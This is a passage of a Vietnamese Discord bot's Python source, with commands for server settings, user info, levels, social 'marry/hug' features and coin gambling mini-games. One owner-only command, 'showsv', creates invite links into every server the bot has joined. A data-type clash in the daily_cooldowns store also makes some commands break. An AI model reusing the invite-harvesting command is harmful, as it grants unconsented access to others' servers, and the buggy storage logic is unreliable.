            del WELCOME_CHANNELS[str(ctx.guild.id)]
            save_all_data()
            embed = discord.Embed(title="✅ ĐÃ TẮT KÊNH CHÀO MỪNG", color=0x00FF00)
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="⚠️ CHƯA CÀI ĐẶT", description="Cú pháp: `n! setwelcome #kênh`", color=0xFF9900)
            await ctx.send(embed=embed)
        return
    WELCOME_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(title="🎉 THIẾT LẬP KÊNH CHÀO MỪNG", description=f"{channel.mention}", color=0x00FF00)
    await ctx.send(embed=embed)

@bot.command(name="setgoodbye")
@owner_only()
async def set_goodbye_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if str(ctx.guild.id) in GOODBYE_CHANNELS:
            del GOODBYE_CHANNELS[str(ctx.guild.id)]
            save_all_data()
            embed = discord.Embed(title="✅ ĐÃ TẮT KÊNH TẠM BIỆT", color=0x00FF00)
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="⚠️ CHƯA CÀI ĐẶT", description="Cú pháp: `n! setgoodbye #kênh`", color=0xFF9900)
            await ctx.send(embed=embed)
        return
    GOODBYE_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(title="😢 THIẾT LẬP KÊNH TẠM BIỆT", description=f"{channel.mention}", color=0xFF0000)
    await ctx.send(embed=embed)

@bot.command(name="setlevelchannel", aliases=["channelslv"])
@owner_only()
async def set_level_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if str(ctx.guild.id) in SERVER_LEVEL_CHANNELS:
            del SERVER_LEVEL_CHANNELS[str(ctx.guild.id)]
            save_all_data()
            embed = discord.Embed(title="🔇 ĐÃ TẮT THÔNG BÁO LEVEL", color=0x00FF00)
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="⚠️ CHƯA CÀI ĐẶT", description="Cú pháp: `n! setlevelchannel #kênh`", color=0xFF9900)
            await ctx.send(embed=embed)
        return
    SERVER_LEVEL_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(title="📈 THIẾT LẬP KÊNH LEVEL UP", description=f"{channel.mention}", color=0xFFD700)
    await ctx.send(embed=embed)

@bot.command(name="log", aliases=["channelslog"])
@owner_only()
async def set_log_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if str(ctx.guild.id) in SERVER_LOG_CHANNELS:
            del SERVER_LOG_CHANNELS[str(ctx.guild.id)]
            save_all_data()
            embed = discord.Embed(title="🔇 ĐÃ TẮT LOG", color=0x00FF00)
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="⚠️ CHƯA CÀI ĐẶT", description="Cú pháp: `n! log #kênh`", color=0xFF9900)
            await ctx.send(embed=embed)
        return
    SERVER_LOG_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(title="✅ ĐÃ THIẾT LẬP LOG", description=f"{channel.mention}", color=0x00FF00)
    await ctx.send(embed=embed)

# ==================== LỆNH THÔNG TIN ====================
@bot.command(name="stats")
async def server_stats(ctx):
    guild = ctx.guild
    embed = discord.Embed(title=f"📊 THỐNG KÊ SERVER {guild.name}", color=0x00FF00)
    embed.add_field(name="🆔 ID", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="👑 Chủ Server", value=guild.owner.mention if guild.owner else "Không rõ", inline=True)
    embed.add_field(name="👥 Số thành viên", value=f"`{guild.member_count}`", inline=True)
    embed.add_field(name="💬 Kênh Văn Bản", value=f"`{len(guild.text_channels)}`", inline=True)
    embed.add_field(name="🔊 Kênh Thoại", value=f"`{len(guild.voice_channels)}`", inline=True)
    embed.add_field(name="🎭 Số lượng Role", value=f"`{len(guild.roles)}`", inline=True)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    await ctx.send(embed=embed)

@bot.command(name="serverinfo")
async def server_info(ctx):
    guild = ctx.guild
    embed = discord.Embed(title=f"🌐 THÔNG TIN SERVER: {guild.name}", color=0x00CCFF)
    embed.add_field(name="🆔 ID", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="👑 Chủ sở hữu", value=guild.owner.mention if guild.owner else "Không có", inline=True)
    embed.add_field(name="📅 Ngày tạo", value=guild.created_at.strftime('%d/%m/%Y %H:%M:%S'), inline=False)
    embed.add_field(name="👥 Thành viên", value=guild.member_count, inline=True)
    embed.add_field(name="📢 Kênh", value=len(guild.channels), inline=True)
    embed.add_field(name="🎭 Role", value=len(guild.roles), inline=True)
    embed.add_field(name="📊 Boost", value=guild.premium_subscription_count or 0, inline=True)
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping(ctx):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(title="🏓 PONG!", description=f"⏱️ Độ trễ: **{latency}ms**", color=0x00FF00 if latency < 200 else 0xFF9900)
    await ctx.send(embed=embed)

@bot.command(name="topcoin")
async def top_coin(ctx):
    sorted_coins = sorted(user_coins.items(), key=lambda x: x[1], reverse=True)[:10]
    if not sorted_coins:
        await ctx.send("Chưa có dữ liệu coin.")
        return
    desc = ""
    for idx, (uid, coins) in enumerate(sorted_coins, 1):
        user = bot.get_user(int(uid))
        name = user.name if user else f"ID:{uid}"
        desc += f"**{idx}.** {name} – `{coins:,}` coin\n"
    embed = discord.Embed(title="🏆 BẢNG XẾP HẠNG COIN", description=desc, color=0xFFD700)
    await ctx.send(embed=embed)

@bot.command(name="toplevel")
async def top_level(ctx):
    sorted_levels = sorted(USER_LEVELS.items(), key=lambda x: x[1]["level"], reverse=True)[:10]
    if not sorted_levels:
        await ctx.send("Chưa có dữ liệu level.")
        return
    desc = ""
    for idx, (uid, data) in enumerate(sorted_levels, 1):
        user = bot.get_user(int(uid))
        name = user.name if user else f"ID:{uid}"
        desc += f"**{idx}.** {name} – Level {data['level']} (Exp: {data['exp']})\n"
    embed = discord.Embed(title="🏆 BẢNG XẾP HẠNG LEVEL", description=desc, color=0x00BFFF)
    await ctx.send(embed=embed)

@bot.command(name="userinfo")
async def user_info(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    embed = discord.Embed(title=f"👤 THÔNG TIN: {member.display_name}", color=member.color)
    embed.add_field(name="🆔 ID", value=f"`{member.id}`", inline=True)
    embed.add_field(name="📅 Tham gia server", value=member.joined_at.strftime('%d/%m/%Y %H:%M:%S') if member.joined_at else "Không rõ", inline=False)
    embed.add_field(name="📅 Tạo tài khoản", value=member.created_at.strftime('%d/%m/%Y %H:%M:%S'), inline=False)
    embed.add_field(name="🎭 Role cao nhất", value=member.top_role.mention if member.top_role else "Không có", inline=True)
    embed.add_field(name="🤖 Bot", value="Có" if member.bot else "Không", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def avatar(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    embed = discord.Embed(title=f"🖼️ AVATAR CỦA {member.display_name}", color=member.color)
    embed.set_image(url=member.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="membercount")
async def member_count(ctx):
    embed = discord.Embed(title="👥 SỐ LƯỢNG THÀNH VIÊN", description=f"Tổng: **{ctx.guild.member_count}**", color=0x00FF00)
    await ctx.send(embed=embed)

@bot.command(name="listroles")
@owner_only()
async def list_roles(ctx):
    roles = [role.name for role in ctx.guild.roles if role.name != "@everyone"]
    if not roles:
        await ctx.send("📭 Không có role nào.")
        return
    embed = discord.Embed(title=f"📋 DANH SÁCH ROLE ({len(roles)})", description="\n".join(roles[:30]), color=0x00CCFF)
    await ctx.send(embed=embed)

@bot.command(name="listchannels")
@owner_only()
async def list_channels(ctx):
    channels = [ch.mention for ch in ctx.guild.text_channels]
    if not channels:
        await ctx.send("📭 Không có kênh văn bản nào.")
        return
    embed = discord.Embed(title=f"📋 DANH SÁCH KÊNH ({len(channels)})", description="\n".join(channels[:30]), color=0x00CCFF)
    await ctx.send(embed=embed)

@bot.command(name="showsv")
@owner_only()
async def showsv(ctx):
    guilds = bot.guilds
    if not guilds:
        await ctx.send("🤖 Bot hiện chưa tham gia server nào.")
        return
    embed = discord.Embed(title=f"🌐 DANH SÁCH MÁY CHỦ ({len(guilds)})", color=0x00FFFF)
    for guild in guilds:
        try:
            owner = guild.owner or await guild.fetch_member(guild.owner_id)
            owner_str = f"{owner} (`{guild.owner_id}`)"
        except:
            owner_str = f"Không xác định (`{guild.owner_id}`)"
        invite_link = "Không thể tạo link"
        try:
            for c in guild.text_channels:
                if c.permissions_for(guild.me).create_instant_invite:
                    invite = await c.create_invite(max_age=300, max_uses=1)
                    invite_link = invite.url
                    break
        except:
            pass
        guild_info = f"👑 **Chủ sở hữu:** {owner_str}\n👥 **Thành viên:** `{guild.member_count}`\n🔗 **Link mời:** {invite_link}"
        embed.add_field(name=f"🏰 {guild.name} (`{guild.id}`)", value=guild_info, inline=False)
    await ctx.send(embed=embed)

# ==================== LỆNH LEVEL ====================
@bot.command(name="setlv")
@owner_only()
async def set_level(ctx, level: int, member: discord.Member):
    try:
        if level < 1:
            await ctx.send("❌ Level tối thiểu là 1!")
            return
        uid = str(member.id)
        USER_LEVELS[uid] = {"exp": 0, "level": level}
        save_json(LEVEL_FILE, USER_LEVELS)
        await check_and_assign_level_roles(member, level)
        embed = discord.Embed(title="⭐ CẬP NHẬT LEVEL", description=f"{member.mention} lên **Level {level}**", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="lv")
async def check_user_level(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    uid = str(member.id)
    user_data = USER_LEVELS.get(uid, {"exp": 0, "level": 1})
    current_level = user_data["level"]
    current_exp = user_data["exp"]
    required_exp = get_required_exp(current_level)
    embed = discord.Embed(title=f"📊 LEVEL - {member.display_name}", description=f"⭐ **Level:** `{current_level}`\n✨ **EXP:** `{current_exp} / {required_exp}`", color=0x00FFFF)
    embed.set_thumbnail(url=member.display_avatar.url)
    await ctx.send(embed=embed)

# ==================== LỆNH TÌNH YÊU ====================
@bot.command(name="love", aliases=["tinhyeu"])
async def love(ctx, user1: discord.Member = None, user2: discord.Member = None):
    if user1 is None:
        await ctx.send("📌 Cú pháp: `n! love @user1 @user2`")
        return
    if user2 is None:
        user2 = ctx.author
        user1, user2 = user2, user1
    percent = random.randint(0, 100)
    if percent < 30:
        result = "💔 Có vẻ không hợp nhau lắm..."
    elif percent < 60:
        result = "😊 Cũng tạm được, có tiềm năng!"
    elif percent < 80:
        result = "❤️ Khá hợp nhau đấy!"
    else:
        result = "💖 Trời sinh một cặp!"
    embed = discord.Embed(title="💘 TỶ LỆ TÌNH YÊU", description=f"{user1.mention} và {user2.mention}\n\n**{percent}%** {result}", color=0xFF69B4)
    embed.set_image(url=random.choice(GIF_LOVE))
    await ctx.send(embed=embed)

@bot.command(name="hug", aliases=["om"])
async def hug(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! hug @user`")
        return
    embed = discord.Embed(title="🤗 ÔM", description=f"{ctx.author.mention} ôm {member.mention} thật chặt!", color=0xFFA500)
    embed.set_image(url=random.choice(GIF_HUG))
    await ctx.send(embed=embed)

@bot.command(name="kiss", aliases=["hon"])
async def kiss(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! kiss @user`")
        return
    embed = discord.Embed(title="😘 HÔN", description=f"{ctx.author.mention} hôn {member.mention} say đắm!", color=0xFF1493)
    embed.set_image(url=random.choice(GIF_KISS))
    await ctx.send(embed=embed)

@bot.command(name="slap", aliases=["tat"])
async def slap(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! slap @user`")
        return
    embed = discord.Embed(title="👋 TÁT", description=f"{ctx.author.mention} tát {member.mention} một phát!", color=0xFF0000)
    embed.set_image(url=random.choice(GIF_SLAP))
    await ctx.send(embed=embed)

@bot.command(name="pat", aliases=["vodau"])
async def pat(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! pat @user`")
        return
    embed = discord.Embed(title="🫳 VỖ ĐẦU", description=f"{ctx.author.mention} vỗ đầu {member.mention} nhẹ nhàng.", color=0xFFD700)
    embed.set_image(url=random.choice(GIF_PAT))
    await ctx.send(embed=embed)

@bot.command(name="cuddle", aliases=["auyem"])
async def cuddle(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! cuddle @user`")
        return
    embed = discord.Embed(title="🥰 ÂU YẾM", description=f"{ctx.author.mention} âu yếm {member.mention}.", color=0xFF69B4)
    embed.set_image(url=random.choice(GIF_CUDDLE))
    await ctx.send(embed=embed)

@bot.command(name="marry", aliases=["cuoi"])
async def marry(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! marry @user`")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự kết hôn với chính mình!")
        return
    guild_id = str(ctx.guild.id)
    if guild_id not in marriages:
        marriages[guild_id] = {}
    user1 = str(ctx.author.id)
    user2 = str(member.id)
    if user1 in marriages[guild_id] or user2 in marriages[guild_id]:
        await ctx.send("❌ Một trong hai người đã kết hôn rồi!")
        return
    marriages[guild_id][user1] = user2
    marriages[guild_id][user2] = user1
    save_json(MARRIAGE_FILE, marriages)
    embed = discord.Embed(title="💍 ĐÁM CƯỚI", description=f"Chúc mừng {ctx.author.mention} và {member.mention} đã trở thành vợ chồng!", color=0xFF69B4)
    embed.set_image(url=random.choice(GIF_LOVE))
    await ctx.send(embed=embed)

@bot.command(name="divorce", aliases=["lyhon"])
async def divorce(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! divorce @user`")
        return
    guild_id = str(ctx.guild.id)
    user1 = str(ctx.author.id)
    user2 = str(member.id)
    if guild_id in marriages and marriages[guild_id].get(user1) == user2:
        del marriages[guild_id][user1]
        del marriages[guild_id][user2]
        save_json(MARRIAGE_FILE, marriages)
        embed = discord.Embed(title="💔 LY HÔN", description=f"{ctx.author.mention} và {member.mention} đã chia tay.", color=0x0000FF)
        await ctx.send(embed=embed)
    else:
        await ctx.send("❌ Hai bạn không phải là vợ chồng!")

@bot.command(name="ship", aliases=["ghepdoi"])
async def ship(ctx, user1: discord.Member = None, user2: discord.Member = None):
    if user1 is None:
        await ctx.send("📌 Cú pháp: `n! ship @user1 @user2`")
        return
    if user2 is None:
        user2 = ctx.author
    percent = random.randint(0, 100)
    if percent < 30:
        result = "💔 Chắc không thành đâu."
    elif percent < 60:
        result = "😊 Có duyên đấy."
    elif percent < 80:
        result = "❤️ Khá là hợp."
    else:
        result = "💖 Sinh ra để dành cho nhau."
    embed = discord.Embed(title="💘 GHÉP ĐÔI", description=f"{user1.mention} và {user2.mention}\n\n**{percent}%** {result}", color=0xFF1493)
    embed.set_image(url=random.choice(GIF_LOVE))
    await ctx.send(embed=embed)

@bot.command(name="crush", aliases=["totoinh"])
async def crush(ctx, member: discord.Member = None, *, message: str = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! crush @user [nội dung]`")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự tỏ tình với chính mình!")
        return
    author = ctx.author
    target = member
    if message:
        dm_content = f"💌 **{target.display_name} ơi,**\n\n{author.display_name} muốn gửi đến bạn lời nhắn:\n\n{message}\n\n— {author.display_name}"
    else:
        sample_messages = random.sample(CRUSH_MESSAGES, 3)
        formatted_messages = [msg.format(author_name=author.display_name, target_name=target.display_name) for msg in sample_messages]
        dm_content = f"💌 **{target.display_name} ơi, {author.display_name} có điều muốn nói với bạn:**\n\n" + "\n\n".join(formatted_messages) + "\n\n# TỚ THÍCH CẬU, CẬU LÀM NGƯỜI YÊU TỚ ĐƯỢC KHÔNG? 💘"
    try:
        await target.send(dm_content)
        await ctx.send(f"✅ Đã gửi lời tỏ tình tới {target.mention} qua tin nhắn riêng!")
    except discord.Forbidden:
        await ctx.send(f"❌ Không thể gửi tin nhắn riêng cho {target.mention} (họ có thể đã chặn bot).")

# ==================== LỆNH KINH TẾ & GAME ====================
@bot.command(name="balance", aliases=["bal", "money", "coin"])
async def balance(ctx, member: discord.Member = None):
    target = member or ctx.author
    coins = get_user_coins(target.id)
    embed = discord.Embed(title="💰 TÀI THẢN", description=f"👤 {target.mention}\n💵 **{coins:,} coin**", color=0xFFD700)
    embed.set_thumbnail(url=target.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="daily")
async def daily_reward(ctx):
    uid = str(ctx.author.id)
    now = datetime.now(timezone.utc)
    last = daily_cooldowns.get(uid)
    if last:
        last_time = datetime.fromisoformat(last)
        if (now - last_time) < timedelta(hours=24):
            remaining = timedelta(hours=24) - (now - last_time)
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            await ctx.send(f"⏳ Bạn đã nhận daily rồi! Vui lòng chờ **{hours}h {minutes}p** nữa.")
            return
    reward = random.randint(500, 2000)
    add_coins(ctx.author.id, reward)
    daily_cooldowns[uid] = now.isoformat()
    save_json(DAILY_FILE, daily_cooldowns)
    embed = discord.Embed(title="🎁 PHẦN QUÀ HÀNG NGÀY", description=f"🎉 Bạn đã nhận **+{reward:,} coin**!", color=0x00FF00)
    await ctx.send(embed=embed)

@bot.command(name="work")
async def work_command(ctx):
    jobs = ["Lập trình Bot Discord", "Rửa bát thuê", "Đi bán vé số", "Chạy Grab", "Giao hàng", "Bán trà đá", "Sửa máy tính", "Viết blog", "Edit video", "Chụp ảnh cưới"]
    job = random.choice(jobs)
    earned = random.randint(200, 800)
    add_coins(ctx.author.id, earned)
    embed = discord.Embed(title="🛠️ LÀM VIỆC", description=f"💼 Bạn làm **{job}** và thu về **+{earned:,} coin**!", color=0x00CCFF)
    await ctx.send(embed=embed)

@bot.command(name="give", aliases=["pay"])
async def give_coins(ctx, member: discord.Member, amount: int):
    if amount <= 0:
        await ctx.send("❌ Số coin chuyển phải lớn hơn 0!")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự chuyển coin cho chính mình!")
        return
    if not subtract_coins(ctx.author.id, amount):
        await ctx.send("❌ Bạn không đủ số coin để chuyển!")
        return
    add_coins(member.id, amount)
    embed = discord.Embed(title="💸 GIAO DỊCH CHUYỂN COIN", description=f"✅ {ctx.author.mention} đã chuyển **{amount:,} coin** cho {member.mention}!", color=0x00FF00)
    await ctx.send(embed=embed)

@bot.command(name="coinflip", aliases=["cf"])
async def coinflip(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin để cược!")
        return
    choice = choice.lower()
    if choice not in ["h", "t", "ngua", "up"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn không hợp lệ! Dùng `h` (Ngửa) hoặc `t` (Úp).")
        return
    result = random.choice(["h", "t"])
    res_str = "Ngửa (Head)" if result == "h" else "Úp (Tail)"
    user_choice_str = "Ngửa (Head)" if choice in ["h", "ngua"] else "Úp (Tail)"
    if (choice in ["h", "ngua"] and result == "h") or (choice in ["t", "up"] and result == "t"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed = discord.Embed(title="🪙 TUNG ĐỒNG XU", description=f"🪙 Kết quả: **{res_str}** | Bạn chọn: **{user_choice_str}**\n🎉 **BẠN THẮNG!** Nhận **+{win:,} coin**!", color=0x00FF00)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🪙 TUNG ĐỒNG XU", description=f"🪙 Kết quả: **{res_str}** | Bạn chọn: **{user_choice_str}**\n💀 **BẠN THUA!** Mất **-{bet:,} coin**.", color=0xFF0000)
        await ctx.send(embed=embed)

@bot.command(name="slots")
async def slots(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin!")
        return
    emojis = ["🍎", "🍋", "🍒", "🍇", "💎", "7️⃣"]
    s1, s2, s3 = random.choice(emojis), random.choice(emojis), random.choice(emojis)
    msg = f"🎰 **SLOTS MACHINE** 🎰\n| {s1} | {s2} | {s3} |\n"
    if s1 == s2 == s3:
        win = bet * 5
        add_coins(ctx.author.id, win)
        embed = discord.Embed(title="🎰 MÁY SLOTS", description=msg + f"🔥 **JACKPOT 3/3!** Bạn thắng **+{win:,} coin**!", color=0xFFD700)
        await ctx.send(embed=embed)
    elif s1 == s2 or s2 == s3 or s1 == s3:
        win = bet * 3
        add_coins(ctx.author.id, win)
        embed = discord.Embed(title="🎰 MÁY SLOTS", description=msg + f"🎉 **TRÚNG 2/3!** Bạn thắng **+{win:,} coin**!", color=0x00FF00)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🎰 MÁY SLOTS", description=msg + f"💀 **THUA RỒI!** Mất **-{bet:,} coin**.", color=0xFF0000)
        await ctx.send(embed=embed)

@bot.command(name="rps")
async def rps(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin!")
        return
    options = {"r": "🪨 Búa", "p": "📄 Bao", "s": "✂️ Kéo"}
    user_c = choice.lower()
    if user_c not in options:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy chọn `r` (Búa), `p` (Bao), hoặc `s` (Kéo)!")
        return
    bot_c = random.choice(["r", "p", "s"])
    msg = f"Bạn chọn **{options[user_c]}** 🆚 Bot chọn **{options[bot_c]}**\n"
    if user_c == bot_c:
        add_coins(ctx.author.id, bet)
        embed = discord.Embed(title="✂️ KÉO BÚA BAO", description=msg + "🤝 **HÒA RỒI!** Đã hoàn lại tiền cược.", color=0xFFFF00)
        await ctx.send(embed=embed)
    elif (user_c == "r" and bot_c == "s") or (user_c == "p" and bot_c == "r") or (user_c == "s" and bot_c == "p"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed = discord.Embed(title="✂️ KÉO BÚA BAO", description=msg + f"🎉 **BẠN THẮNG!** Nhận **+{win:,} coin**!", color=0x00FF00)
        await ctx.send(embed=embed)
    else:
        refund = bet // 2
        add_coins(ctx.author.id, refund)
        embed = discord.Embed(title="✂️ KÉO BÚA BAO", description=msg + f"💀 **BẠN THUA!** Mất **-{bet:,} coin** nhưng được hoàn lại **+{refund:,} coin**.", color=0xFF0000)
        await ctx.send(embed=embed)

@bot.command(name="dice")
async def dice(ctx, bet: int, guess: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    if guess < 1 or guess > 6:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy đoán số từ 1 đến 6!")
        return
    rolled = random.randint(1, 6)
    if guess == rolled:
        win = bet * 5
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎲 Xúc xắc ra **[{rolled}]**! {get_win_msg()} Bạn nhận **+{win:,} coin** 🎉!")
    else:
        await ctx.send(f"🎲 Xúc xắc ra **[{rolled}]**! {get_lose_msg()} Bạn mất **-{bet:,} coin**.")

@bot.command(name="hilo")
async def hilo(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    choice = choice.lower()
    if choice not in ["h", "l"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn `h` (Cao hơn 7) hoặc `l` (Thấp hơn 7)!")
        return
    num = random.randint(1, 13)
    msg = f"🎴 Lá bài mở ra là: **[{num}]**\n"
    if (choice == "h" and num > 7) or (choice == "l" and num < 7):
        win = int(bet * 2)
        add_coins(ctx.author.id, win)
        await ctx.send(msg + f"🎉 **ĐOÁN ĐÚNG!** {get_win_msg()} Bạn nhận **+{win:,} coin**!")
    else:
        await ctx.send(msg + f"💀 **ĐOÁN SAI!** {get_lose_msg()} Bạn mất **-{bet:,} coin**.")

@bot.command(name="crash")
async def crash(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    crash_point = round(random.uniform(1.1, 3.5), 2)
    message = await ctx.send("🚀 **TÊN LỬA ĐANG BAY...**\nHệ số hiện tại: **1.0x**")
    current = 1.0
    for _ in range(5):
        await asyncio.sleep(1)
        current = round(current + random.uniform(0.2, 0.5), 2)
        if current >= crash_point:
            await message.edit(content=f"💥 **CRASH!** Tên lửa phát nổ ở **{crash_point}x**! {get_lose_msg()} Bạn mất **-{bet:,} coin**.")
            return
        await message.edit(content=f"🚀 **TÊN LỬA ĐANG BAY...**\nHệ số hiện tại: **{current}x**")
    win = int(bet * current)
    add_coins(ctx.author.id, win)
    await message.edit(content=f"🎯 **BẠN ĐÃ DỪNG LẠI AN TOÀN!** Rút ở **{current}x** và thắng **+{win:,} coin**! {get_win_msg()} 💎")

@bot.command(name="lottery")
async def lottery(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    luck = random.randint(1, 100)
    if luck > 75:
        win = bet * 10
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎫 **VÉ SỐ TRÚNG ĐẠI PHÁT!** {get_win_msg()} Bạn nhận x10 = **+{win:,} coin** 🎉🎉🎉!")
    else:
        await ctx.send(f"🎫 **VÉ SỐ CHÚC BẠN MAY MẮN LẦN SAU!** {get_lose_msg()} Mất **-{bet:,} coin**.")

@bot.command(name="blackjack", aliases=["bj"])
async def blackjack(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    p_card = random.randint(12, 21)
    b_card = random.randint(15, 21)
    embed = discord.Embed(title="🃏 BLACKJACK 21", color=0x9B59B6)
    embed.add_field(name="Điểm Của Bạn", value=f"`{p_card}`", inline=True)
    embed.add_field(name="Điểm Của Bot", value=f"`{b_card}`", inline=True)
    if p_card > b_card:
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed.description = f"🎉 **BẠN THẮNG!** {get_win_msg()} Nhận **+{win:,} coin**!"
    elif p_card == b_card:
        add_coins(ctx.author.id, bet)
        embed.description = "🤝 **HÒA!** Hoàn lại tiền cược."
    else:
        embed.description = f"💀 **BẠN THUA!** {get_lose_msg()} Mất **-{bet:,} coin**."
    await ctx.send(embed=embed)

@bot.command(name="beg")
async def beg(ctx):
    user_id = ctx.author.id
    if str(user_id) not in daily_cooldowns:
        daily_cooldowns[str(user_id)] = {}
    last = daily_cooldowns[str(user_id)].get("last_beg", 0)
    now = datetime.now().timestamp()
    if now - last < 30:
        await ctx.send(f"⏳ **{ctx.author.display_name}** ơi, vừa xin xong! Hãy chờ **{int(30 - (now - last))} giây** nữa nhé.")
        return
    daily_cooldowns[str(user_id)]["last_beg"] = now
    save_json(DAILY_FILE, daily_cooldowns)
    if random.choice([True, False]):
        earned = random.randint(20, 150)
        add_coins(ctx.author.id, earned)
        await ctx.send(f"🥺 Một người tốt bụng đã cho bạn **+{earned:,} coin** 🪙!")
    else:
        await ctx.send("🤡 Đi chỗ khác xin! Không ai cho bạn đồng nào cả.")

@bot.command(name="crime")
async def crime(ctx):
    user_id = ctx.author.id
    if str(user_id) not in daily_cooldowns:
        daily_cooldowns[str(user_id)] = {}
    last = daily_cooldowns[str(user_id)].get("last_crime", 0)
    now = datetime.now().timestamp()
    if now - last < 60:
        await ctx.send(f"🚨 Công an đang tuần tra! Hãy ẩn nấp thêm **{int(60 - (now - last))} giây** nữa.")
        return
    daily_cooldowns[str(user_id)]["last_crime"] = now
    save_json(DAILY_FILE, daily_cooldowns)
    if random.random() < 0.55:
        earned = random.randint(300, 1200)
        add_coins(ctx.author.id, earned)
        await ctx.send(f"🥷 **THÀNH CÔNG!** Bạn trộm tiệm kim hoàn và thu về **+{earned:,} coin** 🔥!")
    else:
        loss = random.randint(100, 500)
        if not subtract_coins(ctx.author.id, loss):
            loss = 0
        await ctx.send(f"🚔 **THẤT BẠI!** Bạn bị cảnh sát bắt và phạt **-{loss:,} coin** 💸!")

@bot.command(name="bank")
async def bank(ctx, action: str = None, amount: str = None):
    uid = str(ctx.author.id)
    if uid not in user_coins:
        user_coins[uid] = 0
        save_json(COIN_FILE, user_coins)
    bal = user_coins.get(uid, 0)
    if uid not in daily_cooldowns:
        daily_cooldowns[uid] = {}
    bank_bal = daily_cooldowns[uid].get("bank", 0)
    if not action or action not in ["deposit", "withdraw", "dep", "with"]:
        embed = discord.Embed(title="🏦 NGÂN HÀNG", description=f"💵 Tiền mặt: `{bal:,} coin`\n🏦 Tiền gửi: `{bank_bal:,} coin`\n\n`n! bank deposit <số/all>`\n`n! bank withdraw <số/all>`", color=0x00FFCC)
        await ctx.send(embed=embed)
        return
    if action in ["deposit", "dep"]:
        amt = bal if amount == "all" else (int(amount) if amount and amount.isdigit() else 0)
        if amt <= 0 or amt > bal:
            await ctx.send("❌ Số tiền gửi không hợp lệ hoặc bạn không đủ tiền mặt!")
            return
